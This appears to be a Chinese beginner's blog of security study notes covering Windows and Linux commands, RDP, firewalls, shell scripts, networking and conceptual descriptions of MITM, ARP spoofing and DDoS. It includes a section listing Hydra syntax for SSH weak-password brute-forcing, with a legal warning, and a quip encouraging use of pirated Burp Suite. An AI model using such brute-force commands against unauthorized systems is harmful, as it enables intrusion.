windows的一些常规命令自己知道就好，在这里不一一介绍，在下文中提到的命令，如果没见过就自己去搜一搜哈。\nWindows用户与组管理 Windows是多用户操作系统，即同一时间内允许多个用户同时使用计算机。用户组是一系列用户的集合，组内的用户自动具备该组所设置的权限。常用用户：\nsystem：本地机器上拥有最高权限的用户（为系统核心组件访问文件资源提供权限）\nAdministrator：默认系统管理员用户\n常用组:\nSYSTEM：最高权限的组\nAdministrators：管理员组（完全控制权）\nUsers：普通用户组\n诸如上述的效果可以通过这些指令：\n查看用户指令：\n1 net user 查看用户信息：\n1 net user \u0026lt;用户名\u0026gt; 新增用户：\n1 net user \u0026lt;用户名\u0026gt; \u0026lt;密码\u0026gt; /add 删除用户：\n1 net user \u0026lt;用户名\u0026gt; /del #del就是delete（删除）的缩写 新增用户组：\n1 net localgroup \u0026lt;组名\u0026gt; /add 将指定用户添加到指定组：\n1 net localgroup \u0026lt;组名\u0026gt; \u0026lt;用户名\u0026gt; /add 其实还有很多，比如开电脑的“户”的whoami、查看主机名的hostname、查看网络连接是否正常的ping呀、目录dir、天天用的cd/d，这些都是基础，在此提一下就好。\nWindows防火墙 防火墙（firewall）是一项协助确保信息安全的设备，会依照特定的规则，允许或限制传输的数据通过。Windows defender防火墙顾名思义就是在Windows操作系统中系统自带的软件防火墙。它有助于提高计算机的安全性。\n入站规则：别人电脑访问自己电脑的规则，出站规则：自己电脑访问别人电脑的规则。\nRDP远程桌面 RDP远程桌面，即远程桌面协议（Remote Desktop Protocol），是一种由微软公司研发并内置于Windows操作系统中的网络通信协议。\nRDP是一个多通道的协议，它允许用户通过网络连接到提供微软终端机服务的计算机，并在本地计算机上查看和操作远程计算机的桌面界面。通过RDP，用户可以远程登录到运行Windows操作系统的远程计算机，并像在本地计算机上一样使用远程计算机的资源和应用程序，这个其实类似我们如今todesk、向日葵远程等。\n市面上的远程链接软件如todesk都采用自研的混合传输协议，比较安全，而RDP连接没那么可靠，毕竟连接需要给出用户的密码和用户名，这相对有一定的风险。\n接下来使用一下RDP（有些家用版windows是没有RDP功能的，一般企业版多数有，主机没有RDP功能的就下两台虚拟机来实操一下咯）（指令在上文）：\n1、准备一或二台虚拟机win用来远程连接，可以下载两台虚拟机，win7和win 2003，我这里用主机和win7好看些。\n2、虚拟机/主机需要开启远程服务。\n3、防火墙要允许远程服务通过。\n4、创建一个用户用来远程登录，当然用本身用户也可以。\n5、在本地安全策略里的用户权限分配要将新建的用户加进去；在计算机管理里面的组里面的Administrators或者users里面添加刚刚新建的用户。\n6、另外开启一台虚拟机win二号要在开始菜单搜索远程桌面连接输入win1号的IP地址进行连接（相反连接也行），在输入刚刚新建的用户信息即可。\n**前提：两台机子要相互ping通\n我这里用win7和win2003、自己的win11来进行实验。\nLinux系统 林纳斯·本纳第克特·托瓦兹——linux之父概况著名的电脑程序员、黑客。Linux内核的发明人及该计划的合作者。托瓦兹利用个人时间及器材创造出了这套当今全球最流行的操作系统（作业系统）内核之一。\nKali、Ubuntu、Dibian、CentOS下载，主要用Kali（关于Kali下载的问题汇总），Kali也是贯穿网安行业的的一部虚拟机，里面打包了几百种工具，有渗透、运维、蓝红队工具、甚至可以扩展到CTF所用到的基于Linux的python脚本等，而且还有不错的扩展性，可以按照自己的需要去额外加装脚本、软件、工具等。\nDebian：由志愿者开发的发行Linux的非商业项目。\nUbuntu：Debian项目构建的一个Linux发行版，专注于提供用户友好的桌面和服务器操作系统。\nKali：基于Debian的Linux发行版，预装了许多安全工具。\nRedHat：红帽公司，产品包括RHEL、Fedora Core与CentOS。\nCentOS：RHEL依照开放源代码规定释出的源码所编译而成。\n开源\nLinux是一个开源操作系统，源代码对用户开放，使用户可以自由获取、使用和修改。\n稳定\nLinux以其出色的稳定性而闻名。在大量的服务器应用中，稳定性是至关重要的因素。\n安全\nLinux具有良好的安全性。由于其开源性，Linux操作系统可以由全球的开发者社区进行审查和修复漏洞。这使得Linux具备快速响应和更新的能力，以应对不断变化的安全威胁。此外，Linux提供了强大的权限管理和安全工具，帮助管理员保护服务器免受潜在的威胁。\n发行版是指基于开源软件的操作系统的特定版本，经过整合、配置和打包后向用户发布的软件发行形式。它是将开源软件进行定制化和优化的结果，以便用户能够更方便地使用和管理操作系统。\n环境部署 Linux系统环境搭建 Linux常见分系统 Debian/ReaHat\nUbuntu/CentOS\nKali（渗透真神）\nLinux文件与目录管理 系统目录与重要系统文件 文件管理 touch 文件名 ：创建文件\nmkdir 目录名：创建目录 make dir\nmkdir -p a/b ： 同时创建父子目录\ncp：复制文件或目录copy\nmv：移动文件或目录move\nrm 文件或目录 ：删除文件或目录remove\nrm -rf 文件夹 ：删除非空目录\ncat查看文件内容\nhead查看文件头部内容\ntail查看文件尾部内容\ngrep根据匹配规则搜索(查找文件内容)\ngrep -c \u0026ldquo;root\u0026rdquo; /etc/passwd\nfind按照条件查找文件\nfind /etc -name \u0026ldquo;network*\u0026rdquo;\npwd：查看当前所在文件位置\ncd ：切换目录 （后面接绝对路径或相对路径）\nls ：以平铺方式显示当前目录包含内容\nls -a ：查看隐藏文件\nls -l ：以详细列表形式显示当前目录包含内容\nls：列出当前目录下文件\nll/ls -l：列出当前目录下文件（详细）\n命令行通配符\n*匹配0-多个字符\n? 匹配单个字符\n[a-z] 匹配 a - z 之间的一个\n[0-9]\ntouch 文件名 ：创建文件\nmkdir 目录名：创建目录 make dir\nmkdir -p a/b ： 同时创建父子目录\ncp：复制文件或目录copy\nmv：移动文件或目录move\nrm 文件或目录 ：删除文件或目录remove\nrm -rf 文件夹 ：删除非空目录\nLinux用户管理 用户与用户组配置详解 用户（User）\n用户账户：每个使用Linux系统的个体或进程都需要一个用户账户。用户账户包含了用户的信息，如用户名、用户ID（UID）、用户组、家目录、默认Shell等。\nUID（User ID）：每个用户都有一个唯一的数字标识符，称为用户ID（UID）。UID为0的用户是超级用户（root），拥有系统上的所有权限。\nroot\u0026ndash;系统管理员用户信息文件：/etc/passwd文件包含了系统上所有用户的信息。每一行代表一个用户，包括用户名、UID、组ID（GID）、用户全名或描述、家目录、默认Shell等信息。\n用户密码文件：用户的密码信息不直接存储在/etc/passwd文件中，而是存储在/etc/shadow文件中。该文件包含了加密后的密码、密码最后一次更改的日期、密码的最小和最大有效期等信息。\n用户常用命令 查看当前用户：whoami\n查看当前用户详细信息：id\n查看所有用户：cat /etc/passwd（可以看到root的UID为0，是超级用户的特征）\n查看用户数据信息：cat /etc/shadow\n那么用：来分隔的每段字符串是什么意思？kali：用户名。 $y$j9T$zY1oKFxJlTgP2WcJhzbNl1$xhkUmB8R9fzETc/1kgL/nOPcWFTvhn17clxXCgyFjpC：加密后的密码。采用的是带有 salt（盐值）的哈希加密方式，$y$ 等符号是标识加密算法等相关信息，这样的加密能增强密码安全性，防止彩虹表攻击。\n19953：最后一次修改密码的日期，是从 1970 年 1 月 1 日起算的天数。\n0：密码最小修改间隔天数，这里为 0 表示可以随时修改密码。 99999：密码有效期天数，即从最后一次修改密码后，经过这么多天密码就会过期需要修改。\n7：密码过期前提前多少天开始警告用户。\n后面的空字段：分别对应密码过期后的宽限天数（密码过期后仍可登录的天数）、账户失效时间（密码过期且宽限天数过后，账户失效无法登录的日期，这里为空）、保留字段（暂无特定用途）。\n这里了解下就好。\n添加用户：useradd -m 用户名\n删除用户：userdel 用户名\n修改用户信息：usermod\n配置密码：passwd 用户名\n切换用户：su 用户名（不加用户名表示切换root）以系统管理者的身份执行指令：sudo 具体命令 root：最高权限组与用户\n组（Group）\n用户组：用户组用于将多个用户组织在一起，以便于对文件或目录的权限管理。用户可以是多个组的成员。\nGID（Group ID）：每个用户组都有一个唯一的数字标识符，称为组ID（GID）。\n组信息文件：/etc/group文件包含了系统上所有用户组的信息。每一行代表一个组，包括组名、GID、组成员列表等信息。\n用户组常用命令 查看当前用户组：groups\n创建新用户组：groupadd\n删除用户组：groupdel\n修改用户组信息；groupmod\n查看所有组：cat /etc/group\n权限管理 更改文件所有者change owner\nchown kali:kali test\n修改为kali用户，kali组\n修改文件权限change mode\nchmod 777 aa\n给文件aa赋予rwx读、写、执行这三种权限，欸？为什么用数字代表？不是用rwx呢？这是因为：777 是权限数值，由三位数字组成，分别对应文件所有者（user）、所属组（group）、其他用户（other）的权限：数字 7 表示拥有读（r，对应数值 4）、写（w，对应数值 2）、执行（x，对应数值 1）的全部权限（4+2+1=7）。 因此 777 意味着所有者、所属组和其他用户对该文件都拥有读、写、执行的最高权限。\n那比如还有chmod 635就是代表：为目标文件或目录设置上述特定权限组合（所有者 rw-、所属组 -wx、其他用户 r-x）。\nchmod +x aa\nchmod u+x aa\nchmod g-x aa\nchmod u=rwx,g=rx,o=rx 文件名\n对于这个指令chmdo u=rw g=r o=rx aa，作为一个例子，意思是修改目录或文件aa，将赋予user用户有read读、write（w）权限，但没有x执行权限的权限。w在group这里省略了，代表“没有权限”；对于group组，分配read读权限，没有w和x的权限。other其他用户来说，分配read读和x执行权限。如下图所示:\n在这里可以发现，像change mode、password命令一样，都是些缩写，变成chmod、passwd这样的，很多Kali命令都是会缩写的，很好记。\nLinux进程与软件管理 进程概述 Linux系统进程是指在Linux操作系统中运行的每一个独立的任务或程序实例。每个进程都拥有自己的地址空间、系统资源（如文件句柄和内存）以及一个唯一的进程标识符（PID）。Linux通过进程模型实现了多任务处理和并发执行，允许同时运行多个进程。\n进程查看与控制 ifconfig：获取网卡状态或网卡配置\nping：检测网络连通\n这俩命令自己去试吧，我在这里保护好自己就不泄露IP啦\u0026hellip;\u0026hellip;\n当然有时候要用到IP、远程连接这样的话，难免会连接不上，那你可以试着重启，用到ifconfig \u0026lt;网卡比如eth0、eth1这样的\u0026gt; down，这样就把这个网卡关了，然后过一会就再输一次命令，把down换成up，就是开启网卡了。\nps：显示当前终端下运行的进程\nps -aux：显示所有用户的所有进程，包括系统进程，提供更详细的进程信息.第二张图可以看到我们刚刚用了ps -aux指令的记录。\nkill （PID）： 终止指定PID进程\nkill -9 （pid）：强制终止进程（-9 对应信号编号 9，即 SIGKILL 信号，这是一种强制终止信号，具有最高优先级。\n但是我比较建议你用上面的kill（PID），因为通常在进程正常终止（如 kill （PID）发送的 SIGTERM 信号）无效时，才会使用 -9 强制杀死进程，但这种方式可能导致进程正在处理的数据丢失或资源未正常释放，因此需谨慎使用）\n那有个问题来了，服务进程这么多一个个看PID查找忒麻烦啊！那可以用到pidof命令去找到你需要关闭的服务进程的pid。例如要关掉sshd远程连接服务，那我们就用pidof命令去找它的pid：\nnetstat -ano：显示网络状态、查端口、公私网地址、TCP、UDP等。\n软件包管理（deb/rpm、apt/yum） 这里简单知道这个命令就好，基本上配了Kali虚拟机和有下载过CTF的解题工具的经验都见过这些命令：\ndebian\n包格式：.deb\n包管理器：apt\n安装一个包的命令：apt install xx\n这里记得要切换root用户，不然会报错，权限不足\n列出所有可更新的软件清单命令：apt update\n升级软件包：apt upgrade\n在通过Linux进行命令行下载工具时，记得apt update一下噢\n安装指定的软件命令：apt install \u0026lt;package_name\u0026gt;\n删除软件包命令：apt remove \u0026lt;package_name\u0026gt;\n列出所有已安装的包：apt list \u0026ndash;installed\n列出所有已安装的包版本信息：apt list \u0026ndash;all-versions\nredhat\n包格式：.rpm\n包管理器：yum yum install xx\n安装镜像源：vim /etc/apt/sources.list（这个命令比较常用，因为Kali的下载速度比较慢的时候我都会用这个命令去换一下镜像源，阿里云、清华源等，这样速度比较快些）\nLinux系统防火墙 防火墙就是根据系统管理员设定的规则来控制数据包的进出，主要是保护内网的安全。目前Linux系统的防火墙类型主要有两种：分别是iptables和firewalld\niptables-静态防火墙 早期的Linux系统中默认使用的是iptables防火墙，配置文件在/etc/sysconfig/iptables,主要工作在网络层\niptables只可以通过命令行进行配置\niptables默认是允许所有，需要通过拒绝去做限制\niptables在修改了规则之后必须得全部刷新才可以生效，还会丢失连接（无法守护进程）\nfirewalld-动态防火墙（常用） 取代了之前的iptables防火墙，配置文件在/usr/lib/firewalld和/etc/fiewalld中,主要工作在网络层\nfirewalld不仅可以通过命令行进行配置，也可以通过图形化界面配置\nfirewalld默认是拒绝所有，需要通过允许去放行\nfirewalld可以动态修改单条规则，动态管理规则集（允许更新规则而不破环现有会话和连接，可以守护进程，会过滤内网、互联网数据，当前电脑系统都有装防火墙的\n查看firewalld防火墙状态：sudo systemctl status firewalld\n查看iptables防火墙状态（如果系统使用iptables作为防火墙）：sudo systemctl status iptables\n基于RPM的系统安装firewalld：sudo yum install firewalld\n基于Debian的系统（如Ubuntu），虽然通常不预装firewalld，但也可以使用apt命令进行安装：sudo apt install firewalld\n启动firewalld服务：sudo systemctl start firewalld\n关闭firewalld服务：sudo systemctl stop firewalld\n开机自启动：sudo systemctl enable firewalld\n禁止务开机自启动：sudo systemctl disable firewalld\nShell基础与实践 shell脚本\nLinux 的 Shell 种类众多，常见的有：\nBourne Shell（/usr/bin/sh或/bin/sh）\nBourne Again Shell（/bin/bash）\nC Shell（/usr/bin/csh）\nK Shell（/usr/bin/ksh）\nShell for Root（/sbin/sh）\n由于bash易用与免费，其被广泛使用也是大多数Linux系统的默认Shell。(Kali目前为zsh，兼容bash) /bin/bash\n/bin/bash这个shell适用在轻量级程序，易写好操作。\n接下来拿/bin/bash这个shell举个应用例子：\n打开Kali终端，然后输入vim指令：\n在 Kali Linux 中，vim 是一个命令行文本编辑器的启动指令，用于创建、打开和编辑文本文件（如配置文件、脚本、代码等）。当然也是用它来编shell脚本的。\n一开始先点击i键，进入编辑模式，然后再顶行输入#和！，接着输入/bin/bash\n按回车下一行这里我们以简单的echo指令去运行shell，echo类似输出函数print的效果。\n输入好shell后就按Esc键，退出编辑模式，此时输出双引号:，再输入wq+回车保存就好了，然后就自动退出vim模式了，回到命令行界面了，这是这个shell脚本就会保存到相应的路径了，我们可以运行的，\n保存之后，我们找到这个文件，发现是和文本txt有差别的：\n接下来我们运行一下：\n用ll命令去看看权限：\n这里我之前有提到过：该文件权限为 -rw-rw-r--（所有者和所属组有读写权限，其他用户有读权限）\n可以直接用chmod 777 hacker去给这文件提权。\n这里提一下：每个用户其实都有默认的shell的，向上面所讲的那几种的其中之一，如果我们在vim编辑时不声明是用/bin/bash的话就会用用户本身自带的shell，现在可以用echo $SHELL查看一下：\n可以看到不是/bin/bash而是/usr/bin/zsh，也就是说如果你当时在vim编辑中不写明是#!/bin/bash的话，就会默认用zsh去运行那段代码“echo \u0026ldquo;hello hacke!!!!!!r\u0026rdquo;”\n那我觉得好麻烦啊！！！！！！先vim敲代码然后还要chmod给文件执行提权\u0026hellip;.\n这里有个简单方法：\n这样子的话就是强制执行了，bash、sh这种是默认带x执行权限的，bash就是用/bin/bash去执行里头的代码，那sh就是用另外一种不同的去执行里头的代码\u0026hellip;..\nShell的展示就到这里，感兴趣的可以细学，不过我学完C、Python感觉学不下shell了哈哈😄\u0026hellip;..\nXshell\nXshell 是一款功能强大的终端模拟器，它支持SSH、SERIAL等多种协议，可以用于远程连接和管理服务器或虚拟机。在我们以后工作可以用Xshell去连接公司的服务器。（ Xftp 快速传输工具）\n当然习惯用winscp、todesk、电脑自带的RDP这些的话也行。\n连接时记得打开SSH，网络要能ping通\u0026hellip;.\nXshell、Xftp怎么用我不介绍了，搜一搜有教程。\n九头蛇-ssh弱口令爆破实战\n介绍：Hydra是一款强大的网络登录破解工具，可以用于测试SSH等服务的弱口令。Hydra是一个开源的密码破解工具，主要用于网络安全的渗透测试。kali白带无需安装。\n使用语法\u0026mdash;- hydra 参数IP地址 服务名\n常见命令：\nhydra [-l 用户名或者-L 用户名文件路径]\n[-p密码 或者-Р密码文件路径]\n[-t线程数]默认16\n[-vV 显示详细信息]\n[-o 输出文件路径\n[-f找到密码就停止]\n[-e ns 空密码和指定密码试探]\n[ip |-M ip列表文件路径]\n这里给大家这些命令，关于详细用法在后续，下一阶段将和burpsuite细讲\u0026hellip;\u0026hellip;\n法律问题：未经授权对系统进行密码破解是违法行为，仅可在自己拥有或获得明确许可的系统上使用。\n网络安全基础 计算机网络保姆级资料\n计算机网络 计算机网络基础 计算机网络是一组自治计算机互连的集合；\n一个完整的计算机网络系统主要由硬件、软件和协议三大部分组成，缺一不可。\n计算机网络网络的基本功能\n• 资源共享；\n• 分布式处理与负载均衡；\n• 综合信息服务；\n协议：实现通信所需要的一些约定，为使网内各计算机之间的通信可靠有效,通信双方必须共同遵守的规则和约定称为通信协议。\n伴随着计算机网络的飞跃发展，各大厂商根据自己的协议生产出了不同的硬件和软件。为了实现网络设备间的互相通讯，ISO和IEEE相继提出了OSI参考模型及其TCP/IP模型。\n层次模型：计算机网络是一个非常复杂的系统，分层可以将庞大而复杂的问题，转化为若干较小的局部问题，而这些较小的局部问题就比较易于研究和处理。\nOSI与TCP、IP网络模型 OSI参考模型**定义了网络中设备所遵守的层次结构\n分层结构的优点：开放的标准化接口；多厂商兼容；易于理解、学习和更新协议标准；实现模块化工程，降低了开发实现的复杂度；便于故障排除。\nTCP/UDP\u0026ndash;传输层 TCP工作机制：三次握手建立连接，四次挥手断开连接。\nTCP(Transmission Control Protocol 传输控制协议)是一种面向连接的、可靠的。\nUDP协议：\n用户数据报协议，无连接的、不可靠的、基于数据报的传输层通信协议。\n用于数据传输控制的协议，对数据的可靠性、安全没有保证，不需要连接就可以发送。\n总结：\ntcp是面向连接的，udp是面向无连接\ntcp的报文的结构相对要比udp更复杂\ntcp是基于字节流（0、1），udp是基于数据报\ntcp会保证数据的正确性、udp不能，会存在丢包的现象\n交换机与路由器 交换机：\n交换机按照通信两端传输信息的需要，用人工或设备自动完成的方法，把要传输的信息送到符合要求的相应路由上的技术统称。它能够为接入交换机的任意两个网络节点提供独享的电信号通路。\n交换机的工作方式:\n数据包转发\n交换机接收到数据包后，会依据数据包中的目的 MAC 地址来决定将数据包转发到哪个端口。具体过程是，交换机查询自身的 MAC 地址表 ，如果目的 MAC 地址在表中有对应的端口记录，就将数据包转发到该端口；若 MAC 地址表中没有匹配的记录，交换机则会采用泛洪的方式，将数据包转发到除接收端口外的其他所有端口 。例如，在一个办公室网络中，当某台计算机 A 向计算机 B 发送数据时，交换机先查找 MAC 地址表，若找到计算机 B 对应的端口，就把数据包精准发到该端口；若没找到，就会把数据包发到其他所有连接设备的端口，直到计算机 B 接收到并做出回应，交换机也就学习到了计算机 B 的 MAC 地址和对应端口。\nMAC 地址学习\n交换机刚启动时，MAC 地址表是空的。在工作过程中，它会学习连接到各个端口设备的 MAC 地址。当交换机从某个端口接收到一个数据包时，它会记录下数据包源 MAC 地址与该接收端口的对应关系，并将其添加到 MAC 地址表中 。随着时间推移，交换机通过不断接收来自不同设备的数据包，逐渐建立起完整的 MAC 地址表。比如，新接入网络的打印机发送了一个数据包，交换机就会记录下打印机的 MAC 地址和它所连接的端口，下次再有发往该打印机的数据，就能直接转发。\n高速数据传输\n交换机内部采用了并行处理技术，能够同时处理多个端口之间的数据传输，具备很高的数据传输速率。交换机为每个端口提供独立的带宽，端口之间的数据传输可以并行进行，不会产生冲突，这大大提高了网络的整体性能 。比如在一个有 24 个端口的百兆以太网交换机中，每个端口都可以提供 100Mbps 的带宽，不同端口之间的数据传输可以同时进行，极大地提升了数据传输效率，满足了网络中大量设备同时高速传输数据的需求。\n路由器：\n路由器是一种用于连接多个逻辑上分开的网络的\n设备，它能够在多网络互联环境中建立灵活的连接，\n实现不同网络之间的数据传输\n路由决策\n路由决策是路由器 “判断走哪条路转发数据” 的过程，核心是依据路由表选择最优路径，避免数据绕远路或走拥堵的路。\n数据包转发\n路由器的核心作用是将数据包从一个网络转发到另一个网络（比如把家里的局域网数据转发到互联网，或把 A 公司的网络数据转发到 B 公司的网络），关键依赖 “IP 地址” 而非交换机的 “MAC 地址”。\n网络安全\n路由器自带基础的安全功能，能阻挡非法访问、保护内部网络，常见手段包括：\n防火墙功能： 可配置 “访问控制规则”，比如禁止外部网络直接访问内部的服务器（只允许内部主动访问外部），或限制特定 IP / 端口的访问（比如禁止家里的设备访问危险端口 22、3389）。 NAT 地址转换： 把内部的 “私有 IP”（如 192.168.1.x、10.0.0.x）转换成 “公网 IP”，外部网络只能看到公网 IP，无法直接访问内部的私有 IP 设备，相当于给内部网络加了一层 “隐藏保护”。 DHCP 地址过滤： 只给指定 MAC 地址的设备分配 IP（比如只允许家里的手机、电脑连网，陌生设备即使连了 WiFi 也拿不到 IP，无法访问网络）。 VPN 功能： 企业中常用，员工在外网（比如咖啡厅 WiFi）可通过 “VPN 连接” 加密访问公司内部网络，防止数据被窃取。 网络分类\n按照覆盖范围分类\n○局域网（LAN）：局限于较小的地理范围内，如家庭、学校或公司内部的网络。\n○城域网（MAN）：覆盖范围比局域网大，通常覆盖一个城市或地区。\n○广域网（WAN）：覆盖范围广泛，可以跨越多个城市、国家或地区，甚至全球。\nIP地址\u0026ndash;网络层\nIP地址是电子设备（计算机）在互联网上的唯一标识。IP地址分为IPv4和IPv6。IPv4地址由32位二进制组成，采用点分十进制。\nIP主要作用\n标识节点和链路：用唯一的IP地址标识每一个节点;用唯一的IP网络号标识每一个链路。\n寻址和转发：确定节点所在网络的位置，进而确定节点所在的位置;IP路由器选择适当的路径将IP包转发到目的节点。\nIP地址格式表示方法\nIP地址由网络号（包括子网号）和主机号两部分组成。网络位相同的IP地址为同一网段。\n网络号用于区分不同的IP网络。\n主机号用于标识该网络内的一个IP节点。\nIP地址分类\nIPv4地址分为A、B、C、D、E 五类，每一类有不同的划分规则：\n一、A 类地址：面向大型网络的 “骨干级” 地址\n核心特征： 最高位固定为 “0”，地址结构是「1 字节网络位 + 3 字节主机位」（比如10.0.0.0，前 8 位是网络位，后 24 位是主机位）。 关键补充： 地址范围中，1.0.0.0 ~ 126.255.255.255 是合法可用地址，127.0.0.0/8 网段（不止127.0.0.1）均为 “回环地址”，用于本地测试（比如ping 127.0.0.2也能检测本机网络协议栈是否正常）。 每个网络可容纳 2²⁴ - 2 = 16777214 个主机（减 2 是因为 “网络地址” 如10.0.0.0和 “广播地址” 如10.255.255.255不能分配给主机）。 典型场景：早期用于大型企业、运营商骨干网络（比如某省的电信核心网络可能用一个 A 类地址段）。 二、B 类地址：适配中型网络的 “区域级” 地址\n核心特征： 最高两位固定为 “10”，地址结构是「2 字节网络位 + 2 字节主机位」（比如172.16.0.0，前 16 位是网络位，后 16 位是主机位）。 关键补充： 可容纳 2¹⁶ - 2 = 65534 个主机，适合中型园区、高校或集团公司（比如一所大学的校园网可能用一个 B 类地址段，覆盖所有教学楼、宿舍的设备）。 私有 B 类地址段：172.16.0.0 ~ 172.31.255.255（共 16 个网段），常用于企业内部局域网，不对外网路由。 典型场景：中型企业、高校校园网、城市级政务内网。 三、C 类地址：服务小型网络的 “终端级” 地址\n核心特征： 最高三位固定为 “110”，地址结构是「3 字节网络位 + 1 字节主机位」（比如192.168.1.0，前 24 位是网络位，后 8 位是主机位）。 关键补充： 每个网络仅能容纳 2⁸ - 2 = 254 个主机，适合小型办公室、家庭局域网（比如家里的路由器默认用192.168.1.0/24，最多连 254 台设备）。 私有 C 类地址段：192.168.0.0 ~ 192.168.255.255（共 256 个网段），是最常用的内网地址（路由器、摄像头、智能家居设备基本都用这类地址）。 典型场景：家庭 WiFi、小型公司、商铺的局域网。 四、D 类地址：专注 “一对多” 的组播地址\n核心特征： 最高四位固定为 “1110”，地址范围是224.0.0.0 ~ 239.255.255.255，没有网络位和主机位之分，直接代表一个 “组播组”。 关键补充： 不是给单个设备分配，而是给一组设备 “共同订阅”（比如设备加入224.0.0.1组播组，就能接收发给这个组的所有数据）。 常见用途：视频会议（多人同时接收同一视频流，避免重复发送浪费带宽）、安防监控（多个监控屏幕接收同一摄像头的画面）、IPTV（机顶盒接收电视台的组播信号）。 特殊地址：224.0.0.1是 “所有主机组播地址”（同一网段内所有设备都能接收），224.0.0.5是 OSPF 路由协议专用组播地址。 五、E 类地址：预留的 “科研级” 地址\n核心特征： 最高四位固定为 “1111”，地址范围是240.0.0.0 ~ 255.255.255.255，目前没有公开商用，仅用于科研实验、协议测试（比如未来可能的 IPv4 扩展技术研发）。 注意：255.255.255.255是 “全局广播地址”，不属于 E 类的常规用途，发送到这个地址的数据会被同一网段所有设备接收（比如路由器的 DHCP 广播）。 内网与外网 公网地址是由互联网注册机构进行分配的，这些地址在Internet上是唯一的，并且具有全球可达性。公网地址用于Internet上的设备，允许设备在Internet上进行通信。 私网地址则是由局域网管理员自行分配的，它们只在局域网内部具有唯一性。私网地址则仅限于局域网内部使用，不能直接在Internet上访问。这种设计有助于保护内部网络的安全性，防止内部网络与公共网络之间的冲突。 子网掩码：用来确定IP地址的网络位，网络号的位都置1，主机号都置0。\n内网（局域网，LAN）\n定义：内网是指在某一特定区域内由多台计算机以及网络设备构成的网络，如校园网、政府网、企业内网等。\n范围：内网的覆盖范围相对较小，通常仅限于某一建筑物、园区或公司内部，方圆几公里以内。\n外网（广域网，WAN）\n定义：外网又称广域网、公网，是连接不同地区局域网或城域网计算机通信的远程网。\n范围：外网的覆盖范围广泛，可以跨越城市、国家甚至全球，提供远距离通信服务。\n虚拟专用网络（（Virtual Private Network，VPN））\n定义：是指依靠ISP或其他NSP在公用网络基础设施之上构建的专用的安全数据通信网络，只不过这个专线网络是逻辑上的而不是物理的，所以称为虚拟专用网。\n虚拟：用户不再需要拥有实际的长途数据线路，而是使用公共网络资源建立自己的私有网络。\n专用：虚拟出来的网络并非任何连接在公共网络上的用户都能使用，只有经过授权的用户才可以使用。\n常见名词 DNS-域名：由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称\n常见的域名有www.baidu.com , www.taobao.com , www.jd.com 这些都是域名。\n域名可以在Godaddy、Gandi、Hover、Namesilo、Namecheap等网站注册。\n域名由两个或两个以上的词构成，中间由点号分隔开。最右边的那个词称为顶级域名。\nCDN（Content DeliveryNetwork）\n即内容分发网络，CDN的基本思路：是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。\n代理\n代理也称网络代理，是一种特殊的网络服务。它允许客户端通过这个服务与服务器进行连接。简单的来说，可以把代理理解为一种网络中间商。\n网络协议安全 HTTP协议(Hyper Text Transfer Protocol)\n它是从WEB服务器传输超文本标记语言(HTML)到本地浏览器的超文本传输协议。\n建立连接：客户端与服务器之间建立连接。\n发送请求：客户端向服务器发送请求，请求中包含要访问的资源。\n处理请求：服务器接收到请求后，根据请求中的信息找到相应的资源，执行相应的处理操作。\n发送响应：服务器将处理后的结果封装在响应中，并将其发送回客户端。\n关闭连接：在完成请求-响应周期后，客户端和服务器之间的连接可以被关闭。\nHTTPS 协议HyperText Transfer Protocol Secure\n是（超文本传输安全协议）的缩写，是一种通过计算机网络进行安全通信的传输协议。\nHTTPS 的主要作用是在不安全的网络上创建一个安全信道，并可在使用适当的加密包和服务器证书可被验证且可被信任时，对窃听和中间人攻击提供合理的防护。\n关于SSL证书，这个地方可以用我的博客去进做例子：\nExpl0rer.Ct1号\nExpl0rer.Ct2号\n你可以看看1号和2号的区别😄（温馨提醒：打开网站后看左上角）\nhttp、https\nGET：请求从服务器获取指定资源。这是最常用的方法，用于访问页面。\nPOST：请求服务器接受并处理请求体中的数据，通常用于表单提交。\nPUT：请求服务器存储一个资源，并用请求体中的内容替换目标资源的所有内容。\nDELETE：请求服务器删除指定的资源。\nHEAD：与 GET 类似，但不获取资源的内容，只获取响应头信息\nHTTP **响应头信息：**https://expl0rer.top/\nWireshark与Tcpdump Wireshark是一款开源抓包工具，也被称为网络嗅探器，用于分析网络流量和数据包。适用于Windows环境，也支持其他操作系统。当然它也是CTF流量分析中的常用工具。\nTcpdump是一个命令行格式的网络抓包工具，用于捕获和分析网络数据包。适用于Linux环境，是类UNIX系统下用于网络分析和问题排查的首选工具。\nBurpsuite工具 BurpSuite是一款集成化的渗透测试工具，它包含了许多功能，可以帮助安全人员快速完成对web应用程序的渗透测试和攻击。\n网上有众多的破解版，可以自己去“0元购”\u0026hellip;\u0026hellip;\nMITM中间人攻击 MITM（Man-in-the-Middle）中间人攻击是一种网络攻击方式，攻击者通过某种手段将自己插入到通信双方之间，窃取、篡改或者干扰双方的通信内容\nMITM攻击的基本原理是攻击者通过各种技术手段（如ARP欺骗、DNS劫持、Wi-Fi劫持、IP欺骗、SSL/TLS欺骗等），将一台计算机虚拟放置在网络连接中的两台通信计算机之间，这台计算机就称为“中间人”。在这个过程中，攻击者可以截取、查看、篡改、伪造或修改受害者之间的通信数据，以达到窃取敏感信息、篡改数据或实施其他恶意行为的目的。\nARP欺诈攻击 ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。\n僵尸网络与DDOS 僵尸网络\n僵尸网络是由黑客集中控制的一群互联网上的计算机。黑客通过各种手段将大量的主机感染僵尸程序，从而在控制者和被感染主机之间形成一对多的控制僵尸网络。\n僵尸网络是一个可控制的网络，由黑客进行控制。这个网络是采用了一定的恶意传播手段形成的；可以一对多的执行相同的恶意命令，因为数量庞大，一个人无法单独。\nDDos攻击\nDDoS攻击(分布式拒绝服务攻击)是一种常见的网络攻击方式，旨在使目标服务器无法正常提供服务，在DDoS攻击中，攻击者会控制大量的计算机或设备，向目标服务器发送大量的请求，使其超出承受范围，导致服务器无法正常响应请求，从而使服务不可用。\n一种常见的DDoS攻击方式是DNS Request Flood攻击。这种攻击既可以针对DNS缓存服务器，又可以针对DNS授权服务器。攻击者通过直接或间接向DNS服务器发送大量不存在的域名解析请求，导致服务器严重超载，无法继续响应正常用户的DNS请求。这种攻击会导致DNS服务器瘫痪，影响正常业务的进行。\nWeb安全基础 Web基础 Web结构 Web服务器与Web容器\nWeb开放框架\nWeb应用与发展里程\nWeb访问流程 